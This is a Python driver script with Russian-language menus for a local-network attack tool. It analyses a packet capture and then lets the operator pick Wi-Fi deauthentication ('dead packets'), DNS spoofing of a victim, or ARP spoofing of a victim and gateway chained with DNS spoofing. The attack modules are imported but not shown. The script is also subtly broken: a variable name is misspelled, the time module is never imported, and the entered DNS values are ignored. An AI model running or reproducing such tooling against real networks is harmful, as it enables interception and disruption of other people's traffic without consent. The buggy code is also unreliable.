import sys
import arp_spoofing
import dns_spoofing
import flusk_server
import scapy_utils
import pyshark_utils
import dns_server

def menu():
    print("\nВыберите дальнейшее действие:")
    print("1. Отправка мертвых пакетов")
    print("2. DNS Spoofing")
    print("3. ARP Spoofing")
    print("4. Остановить программу")
    choice = input("Введите номер действия: ")
    return choice

if __name__ == "__main__":
    pcapng_file = sys.argv[1]
    network_interface = sys.argv[2]

    total_devices = pyshark_utils.count_devices_in_network(pcapng_file)
    print(f"Total devices in the network: {total_devices}")
    common_ip = pyshark_utils.analyze_pcapng(pcapng_file)

    while True:
        # Меню выбора действия
        choice = menu()

        if choice == '1':
            print("Отправка мертвых пакетов...")
            mac_address = input('Copy mac_adress here')
            scapy_utils.send_deauth(mac_adress)  
        elif choice == '2':
            victim_ip = input("Введите IP жертвы: ") 
            dns_server_ip = input("Введите IP DNS сервера: ") # 127.0.0.1
            spoofed_domain = input("Введите подменяемый домен: ") # some.com
            spoofed_ip = input("Введите подменяемый IP: ") # 0.0.0.0
            print("Запуск DNS Spoofing...")
            spoofer = dns_spoofing.DNSSpoofer(victim_ip, dns_server.DNS_SERVER_IP, dns_server.SPOOFED_DOMAIN, dns_server.SPOOFED_IP)
            spoofer.run()
        elif choice == '3':
            print("Запуск ARP Spoofing...")
            victim_ip = input('IP жертвы')  
            gateway_ip = input('IP шлюза (маршрутизатора)') 
            network_interface = 'en0'  # Имя сетевого интерфейса
            victimmac = input('Mac adress of victim') # b0:be:83:43:9e:9d 
            gatewaymac = input("Mac adress of router") # 28:87:ba:8b:de:7c
            arper = arp_spoofing.Arper(victim_ip, gateway_ip, victimmac, gatewaymac, network_interface)
            arper.run()
            time.sleep(5)
            spoofer = dns_spoofing.DNSSpoofer(victim_ip, dns_server.DNS_SERVER_IP, dns_server.SPOOFED_DOMAIN, dns_server.SPOOFED_IP)
            spoofer.run()
        elif choice == '4':
            print("Остановка программы.")
            break
        else:
            print("Неверный выбор, попробуйте снова.")


'''
sudo ifconfig en0 down
sudo iwconfig en0 mode managed
sudo ifconfig en0 up
'''